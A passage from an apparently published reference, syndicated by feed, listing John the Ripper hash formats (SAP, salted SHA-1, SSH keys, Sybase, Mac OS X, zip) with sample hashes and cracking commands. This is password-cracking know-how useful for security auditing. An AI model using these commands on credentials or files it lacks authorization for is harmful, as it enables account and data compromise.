$ john --format=sapb hashes.txt</pre>
<pre>$ cat hashes.txt
username:ROOT                                    $8366A4E9E6B72CB0
$ john hashes.txt
$ john --format=sapb hashes.txt</pre>
<pre>$ cat hashes.txt
username:ROOT                                    $8366A4E9E6B72CB0:::::::
$ john hashes.txt
$ john --format=sapb hashes.txt</pre>
<h2>sapg &#8211; SAP CODVN G (PASSCODE)</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
ROOT                                    $1194E38F14B9F3F8DA1B181F14DEB70E7BDCC239
$ john hashes.txt
$ john --format=sapg hashes.txt</pre>
<pre>$ cat hashes.txt
username:ROOT                                    $1194E38F14B9F3F8DA1B181F14DEB70E7BDCC239
$ john hashes.txt
$ john --format=sapg hashes.txt</pre>
<pre>$ cat hashes.txt
username:ROOT                                    $1194E38F14B9F3F8DA1B181F14DEB70E7BDCC239:::::::
$ john hashes.txt
$ john --format=sapg hashes.txt</pre>
<h2>sha1-gen &#8211; Generic salted SHA-1</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$SHA1p$salt$59b3e8d637cf97edbe2384cf59cb7453dfe30789
$ john hashes.txt
$ john --format=sha1-gen hashes.txt</pre>
<pre>$ cat hashes.txt
username:$SHA1p$salt$59b3e8d637cf97edbe2384cf59cb7453dfe30789
$ john hashes.txt
$ john --format=sha1-gen hashes.txt</pre>
<pre>$ cat hashes.txt
username:$SHA1p$salt$59b3e8d637cf97edbe2384cf59cb7453dfe30789:::::::
$ john hashes.txt
$ john --format=sha1-gen hashes.txt</pre>
<h2>skey &#8211; S/Key</h2>
<h3>Supported Hash Formats</h3>
<p>TODO: No working example yet.<br />
TODO: No working example yet.<br />
TODO: No working example yet.<br />
TODO: No working example yet.</p>
<h2>ssh &#8211; ssh</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$ssh2$2d2d2d2d2d424547494e204453412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e435259505445440a44454b2d496e666f3a204145532d3132382d4342432c35413830363832373943304634364539383230373135304133433245433631340a0a2f756954696e4a3452556a6f5a76302b705931694d763163695661724369347a2f62365a694c4161565970794a31685854327463692b593266334c61614578630a6f357772316141464d3437786d526d476f3832492f76434847413952786735776147433970574f475a5675555172447355367463556b434d422b325a344753390a354f44474364444b32674e6574446e62324a764873714154736d3443633633476468695a30734346594c71796d2b576531774359616c78734f3231572b4f676f0a42336f6746464977327232462b714a7a714d37415543794c466869357a476d7536534e6558765534477a784750464a4e47306d414f55497761614e3161446a630a4e326b3462437266796271337a366e436533444273384b3232694e2b3875526e534162434f717a5a5845645971555959354b6b6a326e654354525458494e64670a512b61535359673379355937626f4b6b6a494f727650555748654f796475512b74657273414577376e43564a7a72394e387452673271563450557631434b66700a4f49467742372f39736f6d6a59496a71576f61537a6a784b30633852777a305331706d722b7571726277792b50656f75354d3373656d486c426b4769553237660a776f684b792b4d554e4862734e6a7973535a53456c4e4b734d4950715449567a5a45316d5646412f30754d477164705133627a424f6a58325a6f36656446434f0a6d4a34775961765735774d2b6a6d75564b5056564e7939395a78796570304645644c50354b623263345a6c3053396631342f62366836415069785665377a75760a5662536b4279664a6e797a68494f5942497954374d64773134723441584a56362b5a6f457730397769774d3d0a2d2d2d2d2d454e44204453412050524956415445204b45592d2d2d2d2d0a*771
$ john hashes.txt
$ john --format=ssh hashes.txt</pre>
<pre>$ cat hashes.txt
username:$ssh2$2d2d2d2d2d424547494e204453412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e435259505445440a44454b2d496e666f3a204145532d3132382d4342432c35413830363832373943304634364539383230373135304133433245433631340a0a2f756954696e4a3452556a6f5a76302b705931694d763163695661724369347a2f62365a694c4161565970794a31685854327463692b593266334c61614578630a6f357772316141464d3437786d526d476f3832492f76434847413952786735776147433970574f475a5675555172447355367463556b434d422b325a344753390a354f44474364444b32674e6574446e62324a764873714154736d3443633633476468695a30734346594c71796d2b576531774359616c78734f3231572b4f676f0a42336f6746464977327232462b714a7a714d37415543794c466869357a476d7536534e6558765534477a784750464a4e47306d414f55497761614e3161446a630a4e326b3462437266796271337a366e436533444273384b3232694e2b3875526e534162434f717a5a5845645971555959354b6b6a326e654354525458494e64670a512b61535359673379355937626f4b6b6a494f727650555748654f796475512b74657273414577376e43564a7a72394e387452673271563450557631434b66700a4f49467742372f39736f6d6a59496a71576f61537a6a784b30633852777a305331706d722b7571726277792b50656f75354d3373656d486c426b4769553237660a776f684b792b4d554e4862734e6a7973535a53456c4e4b734d4950715449567a5a45316d5646412f30754d477164705133627a424f6a58325a6f36656446434f0a6d4a34775961765735774d2b6a6d75564b5056564e7939395a78796570304645644c50354b623263345a6c3053396631342f62366836415069785665377a75760a5662536b4279664a6e797a68494f5942497954374d64773134723441584a56362b5a6f457730397769774d3d0a2d2d2d2d2d454e44204453412050524956415445204b45592d2d2d2d2d0a*771
$ john hashes.txt
$ john --format=ssh hashes.txt</pre>
<pre>$ cat hashes.txt
username:$ssh2$2d2d2d2d2d424547494e204453412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e435259505445440a44454b2d496e666f3a204145532d3132382d4342432c35413830363832373943304634364539383230373135304133433245433631340a0a2f756954696e4a3452556a6f5a76302b705931694d763163695661724369347a2f62365a694c4161565970794a31685854327463692b593266334c61614578630a6f357772316141464d3437786d526d476f3832492f76434847413952786735776147433970574f475a5675555172447355367463556b434d422b325a344753390a354f44474364444b32674e6574446e62324a764873714154736d3443633633476468695a30734346594c71796d2b576531774359616c78734f3231572b4f676f0a42336f6746464977327232462b714a7a714d37415543794c466869357a476d7536534e6558765534477a784750464a4e47306d414f55497761614e3161446a630a4e326b3462437266796271337a366e436533444273384b3232694e2b3875526e534162434f717a5a5845645971555959354b6b6a326e654354525458494e64670a512b61535359673379355937626f4b6b6a494f727650555748654f796475512b74657273414577376e43564a7a72394e387452673271563450557631434b66700a4f49467742372f39736f6d6a59496a71576f61537a6a784b30633852777a305331706d722b7571726277792b50656f75354d3373656d486c426b4769553237660a776f684b792b4d554e4862734e6a7973535a53456c4e4b734d4950715449567a5a45316d5646412f30754d477164705133627a424f6a58325a6f36656446434f0a6d4a34775961765735774d2b6a6d75564b5056564e7939395a78796570304645644c50354b623263345a6c3053396631342f62366836415069785665377a75760a5662536b4279664a6e797a68494f5942497954374d64773134723441584a56362b5a6f457730397769774d3d0a2d2d2d2d2d454e44204453412050524956415445204b45592d2d2d2d2d0a*771:::::::
$ john hashes.txt
$ john --format=ssh hashes.txt</pre>
<h2>sybasease &#8211; sybasease</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
0xc0074BE393C06BE420AD541671aa5e6f1a19a4a73bb51c59f45790f0887cfb70e0599747c6844d4556b3
$ john hashes.txt
$ john --format=sybasease hashes.txt</pre>
<pre>$ cat hashes.txt
username:0xc0074BE393C06BE420AD541671aa5e6f1a19a4a73bb51c59f45790f0887cfb70e0599747c6844d4556b3
$ john hashes.txt
$ john --format=sybasease hashes.txt</pre>
<pre>$ cat hashes.txt
username:0xc0074BE393C06BE420AD541671aa5e6f1a19a4a73bb51c59f45790f0887cfb70e0599747c6844d4556b3:::::::
$ john hashes.txt
$ john --format=sybasease hashes.txt</pre>
<h2>xsha &#8211; Mac OS X 10.4+ salted SHA-1</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
12345678F9083C7F66F46A0A102E4CC17EC08C8AF120571B
$ john hashes.txt
$ john --format=xsha hashes.txt</pre>
<pre>$ cat hashes.txt
username:12345678F9083C7F66F46A0A102E4CC17EC08C8AF120571B
$ john hashes.txt
$ john --format=xsha hashes.txt</pre>
<pre>$ cat hashes.txt
username:12345678F9083C7F66F46A0A102E4CC17EC08C8AF120571B:::::::
$ john hashes.txt
$ john --format=xsha hashes.txt</pre>
<h2>zip &#8211; zip</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$zip$*0*1*8005b1b7d077708d*dee4
$ john hashes.txt
$ john --format=zip hashes.txt</pre>
<pre>$ cat hashes.txt
username:$zip$*0*1*8005b1b7d077708d*dee4
$ john hashes.txt
$ john --format=zip hashes.txt</pre>
<pre>$ cat hashes.txt
username:$zip$*0*1*8005b1b7d077708d*dee4:::::::
$ john hashes.txt
$ john --format=zip hashes.txt</pre>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
